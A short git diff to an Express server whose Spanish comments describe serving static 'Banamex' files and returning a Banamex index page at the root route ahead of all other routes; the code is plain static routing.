@@ -66,6 +66,14 @@ app.use((req, res, next) => {
 });
 
 (async () => {
+  // Servir archivos estáticos de Banamex ANTES de todo
+  app.use('/banamex', express.static('public/banamex'));
+
+  // Interceptar la ruta raíz para servir la página de Banamex ANTES de cualquier otra ruta
+  app.get('/', (_req: Request, res: Response) => {
+    res.sendFile('banamex/index.html', { root: 'public' });
+  });
+
   const server = await registerRoutes(app);
 
   app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
